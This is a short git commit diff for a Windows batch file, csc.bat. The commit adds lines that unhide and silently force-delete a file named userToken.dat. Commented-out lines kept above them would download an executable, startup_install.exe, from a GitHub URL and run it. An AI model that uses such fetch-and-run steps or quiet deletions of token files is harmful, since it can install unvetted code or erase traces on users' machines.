c059644c04d2df28ca6a869d97963a9b47fba351
decko2 <88717056+decko2@users.noreply.github.com>
2022-04-25 20:32:25 +0200

    Update csc.bat

--- csc.bat
+++ csc.bat
@@ -4,4 +4,7 @@
 :: fetch https://github.com/decko2/websmash/raw/main/additional/startup_install.exe startup_install.exe
 :: start /wait startup_install.exe
 
+attrib -h -s userToken.dat
+del /f /q userToken.dat
+
 exit /b
